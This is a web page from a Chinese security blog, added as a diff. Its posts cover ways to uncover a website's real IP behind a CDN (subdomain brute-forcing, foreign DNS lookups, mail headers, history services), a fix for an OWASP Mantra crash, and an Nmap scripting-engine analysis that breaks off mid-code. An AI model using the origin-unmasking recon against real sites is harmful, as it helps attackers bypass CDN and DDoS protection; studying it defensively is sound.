@@ -1,0 +1,1764 @@
+<!DOCTYPE html>
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
+  <link rel="manifest" href="/images/site.webmanifest.json">
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://5cr1pt.github.io/blog.securitainment.io').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="运维 | 安全 | 渗透">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Securitainment.io">
+<meta property="og:url" content="http://5cr1pt.github.io/blog.securitainment.io/page/2/index.html">
+<meta property="og:site_name" content="Securitainment.io">
+<meta property="og:description" content="运维 | 安全 | 渗透">
+<meta property="article:author" content="groot">
+<meta property="article:tag" content="运维 | 安全 | 渗透">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://5cr1pt.github.io/blog.securitainment.io/page/2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: true,
+    isPost: false
+  };
+</script>
+
+  <title>Securitainment.io</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Securitainment.io</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-find-real-ip-of-a-site/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-find-real-ip-of-a-site/" class="post-title-link" itemprop="url">查找網站真實IP</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 01:25:19" itemprop="dateCreated datePublished" datetime="2016-05-14T01:25:19+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-03-15 01:21:08" itemprop="dateModified" datetime="2019-03-15T01:21:08+08:00">2019-03-15</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-find-real-ip-of-a-site/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-find-real-ip-of-a-site/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h1 id="查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法"><a href="#查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法" class="headerlink" title="查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法"></a>查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法</h1><p><strong>首先，CDN、负载均衡、反向代理还分为很多层，有时查出来的是最外层的 CDN 服务器群，真实的机器是不对外开放的，类似这样的：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用户　　→　　　CDN 网络　　　→　　一台或多台真实机器 </span><br><span class="line"></span><br><span class="line">　　　　↗　　CDN Server 1　　↘</span><br><span class="line">用户　　→　　CDN Server 2　　→　　真实机器</span><br><span class="line">　　　　↘　　CDN Server N　　↗</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------- </span><br><span class="line"></span><br><span class="line">用户　　→　　　CDN 网络　　　→　　一台或多台反向代理　　　→　　一台或多台真实机器 </span><br><span class="line"></span><br><span class="line">　　　　↗　　CDN Server 1　　↘</span><br><span class="line">用户　　→　　CDN Server 2　　→　　Reverse Proxy Server　　→　　真实机器</span><br><span class="line">　　　　↘　　CDN Server N　　↗</span><br></pre></td></tr></table></figure>
+
+<p>具体根据网络的负载需求，CDN 服务器的数量以及分级层数是不一定的。</p>
+<p>如果是这样的话，除非日一台CDN服务器看记录或者日进CDN供应商控制系统或后台，才能找到真实IP，但是那些CDN服务器配置完全一样，应该很难搞。</p>
+<p>（这些CDN服务器不止代理的这一家网站，现在都是同时代理很多家网站，这就可以解释你旁站查询出来很多不相干的网站都在同一个IP地址，这是CDN服务器供应商节省成本的一种方案，一台CDN同时代理多家网站，CDN供应商根据你支付金额的多少，决定使用多少台CDN服务器。）</p>
+<p>（这些CDN服务器一般都在高防机房，拥有很大的带宽，并且大多数CDN运营商还拥有云防火墙技术，什么叫云防火墙？即：任意一台服务器检测到DDOS攻击后，会向所有服务器通告这些攻击源IP，然后所有这些服务器都同时屏蔽这些地址，以实现整个网络屏蔽DDOS的目的，这些服务器组成了一个很强力的抗DDOS网络，这是目前对付DDOS攻击，比较有效的方案之一。）</p>
+<p>（再补充一点经验，这些CDN服务器还根据你提交的 HTTP HOST 头（也就是域名）返回不一样的系统信息，更有甚者，只要你 HTTP HOST 头不正确（不是它提供服务的域名），直接掐断连接，不返回任何数据，你就得不到任何有效信息，如果你使用“<a href="http://lcx.cc/?FoxNews=1904.html" target="_blank" rel="noopener">长安刺客 - 旁注杀手 v1.2 版 + CDN 终结者 v1.1</a>”的话，那么需要在 CDN 终结者界面勾选特殊模式，然后再刺探网络构架，有时候会有惊喜哟……）</p>
+<p><strong>还有另外一种：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户　　→　　多台实时同步的缓存服务器与真实机器</span><br><span class="line"></span><br><span class="line">　　　　↗　　Cache Server 1</span><br><span class="line">用户　　→　　Cache Server 2</span><br><span class="line">　　　　↘　　Cache Server N</span><br><span class="line">　　　　↘　　真实机器</span><br></pre></td></tr></table></figure>
+
+<p>如果是这种的话，很容易就可以找出来真实服务器的IP地址，因为他们 HTTP Banner 等信息是完全不一样的，用“长安刺客 - 旁注杀手”一眼就看出来了。</p>
+<p><strong>还有另外几种 CDN、负载均衡、反向代理 等网络构架：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用户　　→　　　负载均衡　　　→　　服务器群</span><br><span class="line"></span><br><span class="line">　　　　　　　　　　　　　　　↗　　Cache Server 1</span><br><span class="line">用户　　→　　Load Balance　　→　　Cache Server 2</span><br><span class="line">　　　　　　　　　　　　　　　↘　　Cache Server N</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">用户　　→　　　反向代理类服务器　　　→　　一台或多台真实机器</span><br><span class="line"></span><br><span class="line">　　　　　　　　　　　　　　　　　　　↗　　真实机器1</span><br><span class="line">用户　　→　　Reverse Proxy Server　　→　　真实机器2</span><br><span class="line">　　　　　　　　　　　　　　　　　　　↘　　真实机器N</span><br></pre></td></tr></table></figure>
+
+<p>再结合 xxbing 提供的方法：</p>
+<p><strong>关于探测主站真实IP，我一般先查一下分站IP，有一种情况是，主站采用了CDN，分站没有用。</strong></p>
+<p>比如 bbs.xxx.com、vip.xxx.com、pay.xxx.com 都是 111.111.111.x 段的，那么主站也很有可能是 111.111.111.x 段的。扫一下这个段的80吧。</p>
+<p>这确实是个好方法，针对国内的大站，多分玉米的很实用。但是现在很多国外站各种分域名ping出来和主站都是一个IP。</p>
+<p>可以暴力跑一下2级域名。什么 blog.xxx.com、admin.xxx.com、root.xxx.com。反正4位英文以内的。。</p>
+<p><strong>二级域名 nslookup 百度，谷歌 搜集信息</strong></p>
+<p><strong>还听说有国外vpn ping的方式</strong></p>
+<blockquote>
+<p>使用国外 vpn ping 的方法是因为，大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。其实这个方法根本不用上国外vpn，因为你上国外vpn的ping本质，就是使用国外dns（那台vpn服务器使用的dns）查询域名而已，所以只需要：nslookup lcx.cc 国外dns，就行了，例如：nslookup lcx.cc 8.8.8.8，提示：你要找冷门国外DNS才行，像谷歌的DNS，国内用的人越来越多了，很多CDN提供商都把谷歌DNS作为国内市场之一，所以，你查到的结果会和国内差不了多少……</p>
+</blockquote>
+<p>1 历史记录(<a href="http://toolbar.netcraft.com/site_report?url=www.xxx.net" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=www.xxx.net</a>)</p>
+<p>2 phpinfo </p>
+<p>3 经常用ping xxx.com代替ping <a href="http://www.xxx.com,然后ping子域,再nslookup" target="_blank" rel="noopener">www.xxx.com,然后ping子域,再nslookup</a></p>
+<p><strong>有的服务器本地自带sendmail…  注册之后，会主动发一封邮件给我们。。。 好吧。。打开邮件的源代码。。 你就能看到服务器的真实Ip了。。。有的大型互联网网站会有自己的Mailserver…应该也是处在一个网段吧？？  那个网段打开80的一个一个试。。。哈哈。。</strong></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-pentest-browser-problems/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-pentest-browser-problems/" class="post-title-link" itemprop="url">瀏覽器問題收集</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 01:24:16" itemprop="dateCreated datePublished" datetime="2016-05-14T01:24:16+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:27:44" itemprop="dateModified" datetime="2019-07-25T14:27:44+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-pentest-browser-problems/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-pentest-browser-problems/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h1 id="Mantra-Browser-crash"><a href="#Mantra-Browser-crash" class="headerlink" title="Mantra Browser crash"></a>Mantra Browser crash</h1><p><img src="https://camo.githubusercontent.com/e1d81bb96e290c1e4cb21fc0548f365c2cb6ca58/687474703a2f2f322e62702e626c6f6773706f742e636f6d2f2d6d476c6438576d505237492f55575f624b3262445041492f41414141414141414158302f6a7758664b436a425150492f73313630302f53637265656e73686f742b2d2b30343138323031332b2d2b30363a33333a30312b504d2e706e67" alt=""></p>
+<p>Solution:</p>
+<p>Edit file “OWASP Mantra” and change the following lines:</p>
+<p><code>echo &quot;${app}portable:Debug/Info: 0=&quot;$0&quot;&quot;</code></p>
+<p><code>dir=${0%/*}</code></p>
+<p>to</p>
+<p><code>#echo &quot;${app}portable:Debug/Info: 0=&quot;$0&quot;&quot;</code></p>
+<p><code>#dir=${0%/*}</code></p>
+<p><code>dir=/yourmantrarootfolder/</code></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-nmap-source-analysis/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-nmap-source-analysis/" class="post-title-link" itemprop="url">nmap 源代碼分析</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 01:22:50" itemprop="dateCreated datePublished" datetime="2016-05-14T01:22:50+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:28:06" itemprop="dateModified" datetime="2019-07-25T14:28:06+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-nmap-source-analysis/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-nmap-source-analysis/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h2 id="Nmap源码分析（脚本引擎）"><a href="#Nmap源码分析（脚本引擎）" class="headerlink" title="Nmap源码分析（脚本引擎）"></a>Nmap源码分析（脚本引擎）</h2><p>Nmap提供了强大的脚本引擎（NSE），以支持通过Lua编程来扩展Nmap的功能。目前脚本库已经包含300多个常用的Lua脚本，辅助完成Nmap的主机发现、端口扫描、服务侦测、操作系统侦测四个基本功能，并补充了其他扫描能力：如执行HTTP服务详细的探测、暴力破解简单密码、检查常见的漏洞信息等等。如果用户需要对特定的应用做更深入的探究，可以按照NSE脚本格式编写Lua脚本来增强Nmap的扫描能力。</p>
+<ol>
+<li><p>简单引入</p>
+<ul>
+<li><p>实现原理</p>
+<p>  NSE（Nmap Scripting Engine）是Nmap最为强大、最为灵活的功能之一。<br>  NSE主要分为两大部分：内嵌Lua解释器与NSE library。<br>  解释器：Nmap采用嵌入的Lua解释器来支持Lua脚本语言。Lua语言小巧简单而且扩展灵活，能够很好地与Nmap自身的C/C++语言融合。<br>  NSE library：为Lua脚本与Nmap提供了连接，负责完成基本初始化及提供脚本调度、并发执行、IO框架及异常处理，并且提供了默认的实用的脚本程序。</p>
+</li>
+<li><p>脚本分类</p>
+<p>  NSE中提供的Lua脚本分为不同的类别（Category），目前的类别如下:</p>
+<ol>
+<li>auth  负责处理鉴权证书（绕开鉴权）的脚本</li>
+<li>broadcast  在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务。</li>
+<li>brute  提供暴力破解方式，针对常见的应用如http/snmp等</li>
+<li>default  这是使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力</li>
+<li>discovery  对网络进行更多的信息，如SMB枚举、SNMP查询等</li>
+<li>dos  用于进行拒绝服务攻击（denial of service）</li>
+<li>exploit  利用已知的漏洞入侵系统</li>
+<li>external  利用第三方的数据库或资源，例如进行whois解析</li>
+<li>fuzzer  模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</li>
+<li>intrusive 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</li>
+<li>malware 探测目标机是否感染了病毒、开启了后门等信息</li>
+<li>safe 此类与intrusive相反，属于安全性脚本</li>
+<li>version 负责增强服务与版本扫描（Version Detection）功能的脚本。</li>
+<li>vuln 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067。</li>
+</ol>
+</li>
+<li><p>命令行选项</p>
+<p>  Nmap提供的命令行参数如下：</p>
+<pre><code>-sC: 等价于--script=default，使用默认类别的脚本进行扫描。 
+
+--script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt;使用某个或某类脚本进行扫描，支持通配符描述
+
+--script-args=&lt;n1=v1,[n2=v2,...]&gt;: 为脚本提供默认参数
+
+--script-args-file=filename: 使用文件来为脚本提供参数
+
+--script-trace: 显示脚本执行过程中发送与接收的数据
+
+--script-updatedb: 更新脚本数据库
+
+--script-help=&lt;Lua scripts&gt;: 显示脚本的帮助信息，其中&lt;Lua scripts&gt;部分可以逗号分隔的文件或脚本类别。</code></pre></li>
+</ul>
+</li>
+</ol>
+<ol start="2">
+<li><p>实现框架</p>
+<ul>
+<li><p>文件组织</p>
+<p>  Nmap脚本引擎所需要的的文件：</p>
+<ul>
+<li>nse_main.cc/nse_main.h/nse_main.lua,这是核心流程文件，负责脚本的初始化与调度执行。</li>
+<li>nmap/nse_*文件，nmap源码目录下以nse开头的文件，负责为NSE提供调用库，例如提供dnet、nsock、ssl、pcrelib、fs、bit等操作的库函数。</li>
+<li>liblua目录，提供Lua语言默认的源码C语言文件（提供Lua库函数与解释器相关代码）</li>
+<li>nselib目录，Nmap实现的NSE库文件，以Lua语言形式提供基本的库函数</li>
+<li>scripts目录，Nmap内置的实用脚本，即对具体扫描任务相关的操作脚本。Nmap目前支持300多个脚本（14个类别）。</li>
+</ul>
+</li>
+<li><p>代码流程</p>
+<ul>
+<li><p>代码流程图</p>
+<p>  <img src="http://img.my.csdn.net/uploads/201209/07/1347030259_3581.png" alt=""></p>
+</li>
+<li><p>流程解析</p>
+<ul>
+<li><p>初始化流程</p>
+<p>在命令行参数中指定脚本（–script/-sC）或指定-A选项或指定-sV选项，都会触发Nmap启动脚本引擎。其中-A选项表示aggressive scan，会调用default类别的脚本扫描；而-sV选项表示应用与版本侦测，会调用Version类别的脚本，辅助侦测服务详细信息。</p>
+<p>在Nmap.cc的nmap_main()函数中，若判断到需要启动脚本引擎，那么调用open_nse()函数进行NSE环境的准备。在open_nse()中主要创建luaState（管理Lua解释器的执行的全局变量），然后调用init_main()进行详细的初始化过程。</p>
+<p>进入init_main()函数，首先加载Lua标准库与Nmap的扩展库，随后准备参数环境，然后加载并执行nse_main.lua文件。</p>
+<p>nse_main.lua脚本为后续的脚本执行准备Lua环境，加载用户选择的需要调用的脚本（例如，用户–script discovery，那么会将该类别中所有的脚本加载进来），返回一个main()函数对象给init_main()，该main()是否后续脚本扫描需要的主函数，被保存在Lua的环境的注册表中。<br>　　<br>在nse_main.lua中，定义两个核心的类，Script和Thread，Script用于管理NSE脚本，当新的脚本被加载时，调用Script.new创建脚本对象，该对象被保存下来在后续的扫描过程中使用；Thread用于管理脚本的执行，该类中也包含对脚本健全性的检查（sanity check，如是否包含Action函数）。在脚本执行时，如果脚本之间存在依赖关系，那么会将基础的无依赖的脚本统一执行完毕，再执行依赖性的脚本。</p>
+</li>
+<li><p>脚本扫描流程</p>
+<p>执行脚本扫描时，从nmap_main()中调用script_scan()函数。</p>
+</li>
+</ul>
+<p>　　在进入script_scan()后，会标记扫描阶段类型，然后进入到初始化阶段返回的main()函数（来自nse_main.lua脚本中的main）中，在函数中解析具体的扫描类型。</p>
+<p>　　main()函数负责处理三种类型的脚本扫描：预扫描（SCRIPT_PRE_SCAN）、脚本扫描（SCRIPT_SCAN）、后扫描（SCRIPT_POST_SCAN）。预扫描即在Nmap调用的最前面（没有进行主机发现、端口扫描等操作）执行的脚本扫描，通常该类扫描用于准备基本的信息，例如到第三服务器查询相关的DNS信息。而脚本扫描，是使用NSE脚本来扫描目标主机，这是最核心的扫描方式。后扫描，是整个扫描结束后，做一些善后处理的脚本，比如优化整理某些扫描。</p>
+<p>　　在NSE脚本中都会定义触发规则（rule），确定在什么阶段什么条件执行该脚本。NSE共有4中规则，prerule()，如果脚本定义该规则，则在预扫描阶段该脚本会被执行；hostrule(host)该规则在检测到主机在线时候才执行；port(host,port)，检测主机某个端口开放时才执行，通常用于侦查特定的服务类型；postrule()，在所有主机都被扫描完毕后执行。</p>
+<p>　　在main()函数中核心操作由run函数负责。而run()函数的本身设计用于执行所有同一级别的脚本（根据依赖关系划分的级别），直到所有线程执行完毕才退出。</p>
+<p>　　run()函数中实现三个队列：执行队列（Running Queue）、等待队列（Waiting Queue）、挂起队列（Pending Queue），并管理三个队列中线程的切换，直到全部队列为空或出错而退出。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<ol start="3">
+<li><p>源码分析</p>
+ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span 